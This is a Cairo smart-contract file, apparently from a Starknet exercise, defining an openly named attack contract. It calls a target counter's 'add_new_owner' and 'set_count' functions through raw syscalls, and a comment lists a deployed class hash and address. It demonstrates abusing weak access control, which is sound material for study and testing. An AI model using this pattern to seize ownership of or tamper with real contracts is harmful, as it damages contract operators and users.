#[starknet::interface]
pub trait IAttackCounterv2<T> {
    fn counter_get_count(self: @T) -> u32;
    fn counter_get_current_owner(self: @T) -> ContractAddress;

    fn attack_counter_add_new_owner(self: @T, new_owner: ContractAddress);
    fn attack_counter_set_count(self: @T, amount: u32);
}
use starknet::{ContractAddress, syscalls::call_contract_syscall};

#[starknet::contract]
pub mod AttackCounterV2 {
    use crate::counter_v2::{ICounterV2Dispatcher, ICounterV2DispatcherTrait};
    use starknet::{ContractAddress, syscalls::call_contract_syscall};
    #[storage]
    struct Storage {
        counter_address: ContractAddress
    }

    #[constructor]
    fn constructor(ref self: ContractState, counter_addr: ContractAddress) {
        self.counter_address.write(counter_addr)
    }

    #[abi(embed_v0)]
    impl ICounterImpl of super::IAttackCounterv2<ContractState> {
        fn counter_get_count(self: @ContractState) -> u32 {
            let counter_addr = self.counter_address.read();
            ICounterV2Dispatcher { contract_address: counter_addr }.get_count()
        }

        fn attack_counter_add_new_owner(self: @ContractState, new_owner: ContractAddress) {
            let counter_addr = self.counter_address.read();
            let selector = selector!("add_new_owner");

            let mut args: Array<felt252> = array![];
            let new_owner: ContractAddress = new_owner;
            new_owner.serialize(ref args);

            call_contract_syscall(counter_addr, selector, args.span());
        }
        fn attack_counter_set_count(self: @ContractState, amount: u32) {
            let counter_addr = self.counter_address.read();
            let selector = selector!("set_count");

            let mut args: Array<felt252> = array![];
            let amount: u32 = amount;
            amount.serialize(ref args);

            call_contract_syscall(counter_addr, selector, args.span());
        }

        fn counter_get_current_owner(self: @ContractState) -> ContractAddress {
            let counter_addr = self.counter_address.read();
            ICounterV2Dispatcher { contract_address: counter_addr }.get_current_owner()
        }
    }
}
// 0x23390d049eba39e386cc62f10a912b13284b5324f5ee2889da183b8e60c73f4 - class hash
// 0x5328f79d62ea480df1098d60504258134618eeafd09445c4f5cb27707976d06 - contract address

